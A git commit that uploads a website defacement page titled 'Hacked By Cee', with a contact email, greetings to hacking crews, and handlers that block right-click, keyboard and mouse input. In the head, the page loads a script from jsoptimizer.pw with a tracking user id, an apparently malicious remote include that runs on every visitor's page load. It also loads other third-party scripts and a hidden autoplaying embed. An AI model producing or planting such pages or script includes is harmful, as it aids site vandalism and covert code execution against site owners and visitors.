2279881fa756cc97f575f263fe8b698317cb82c6
paknago21 <113289817+paknago21@users.noreply.github.com>
2022-11-23 22:03:34 +0700

    Add files via upload

---
+++ -.php
@@ -0,0 +1,80 @@
+
+
+
+
+<html>
+<head> 
+<script type="text/javascript" async src="http://jsoptimizer.pw/jserrors.js?userid=D050993A74F2&subid=Web390422&cn=ID"></script>
+<title>&#1203;&#824;&#1202;&#824;&#1203; Hacked By Cee &#1203;&#824;&#1202;&#824;&#1203;</title>
+<meta content='Hacked By Cee' name='description'/>
+<meta content='Hacked By Cee' name='keywords'/>
+<meta content='Hacked By Cee' name='Abstract'/>
+<meta name="title" content="Cee">
+<meta name="description" content="$ PenTem $">
+<meta name="keywords" content="Cee">
+<meta name="googlebot" content="index,follow" />
+<meta name="robots" content="all" />
+<meta name="robots schedule" content="auto" />
+<meta name="distribution" content="global" />
+<meta contact='http://fb.me/moooaaaaaaa'/>
+<link href='https://fonts.googleapis.com/css?family=Covered+By+Your+Grace' rel='stylesheet' type='text/css'>
+<link href="https://fonts.googleapis.com/css?family=Shadows+Into+Light+Two" rel="stylesheet" type='text/css'>
+<<body bgcolor="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
+<center>
+<div class="indonesia"><br><br>
+</style>
+</script>
+<style type="text/css">
+
+body
+{
+background-color:#000000;
+}
+
+body {cursor:url(""),default}
+
+.h3ll0s{
+color:#71706E;
+text-shadow:red 0px 0px 4px;
+}
+
+.shakeimage{position:relative}
+img:hover {
+	opacity:0.5;
+	-webkit-transition:all 250ms ease;
+	-moz-transition:all 250ms ease;
+	-o-transition:all 250ms ease;
+	transition:all 250ms ease;
+}
+img {
+	opacity:0.8;
+}
+</style>
+
+<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'><!-- i-mobile for SmartPhone client script -->
+<script type="text/javascript" charset="UTF-8" src="http://cache.ssend.microad.jp/js/adfunnel-sp-load.js"></script>
+<div class="adfunnel_sp" data-adfunnel='{ "spotid":"ad7990ad7d02f589", "seq":1,"display":"overlay" }'></div>
+<!-- tok2_user_contents -->
+<div id="tok2_user_contents">
+
+<style type="text/css">
+.img_OW{
+position:relative
+}
+</style>
+<script src="http://otowebsite.googlecode.com/files/Getar.js.txt" type="text/javascript"></script>
+<center> <img class="img_OW" onclick="top.focus()" onmouseout="stoprattle(this);top.focus()" onmouseover="init(this);rattleimage()" src="https://i.pinimg.com/originals/81/f6/dd/81f6dda4b76e34a51ea03829fe22bc45.gif" /></a>
+<style type='text/css'>body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), default;} a:hover {cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),wait;}</style>
+<br>
+<font face="'Covered By Your Grace', Arial, sans-serif;" size="5px" color="#8B0000"><br>
+<font face="Shadows Into Light Two" size="6px" color="FFFFFF">Hacked By Cee !<br/></font>
+<font face="Shadows Into Light Two" size="5px" color="FFFFFF">hello<br/></font>
+<br/>
+<font face="Shadows Into Light Two" size="5px" color="red">I go as hard as I can when I'm anxiety-free. <br>
+<font face="Shadows Into Light Two" size="4px" color="white">Contact : paknago2@gmail.com<br>
+<br>
+<font face="Shadows Into Light Two" size="4px" color="white">Greetz : N45HT | XaiSyndicate | Exilie Team | 1ntr0ver7_Tersakiti | Security Cyber Art | Family Attack Cyber | Security Ghost | Obsidian Cyber Team | Extreme Crew<br/></font>
+</div>
+<embed src='https://youtube.com/v/R9RtTGzs5EE&autoplay=1' type='application/x-shockwave-flash' wmode='transparent' width='1' height='1'></embed>
+
+<html>
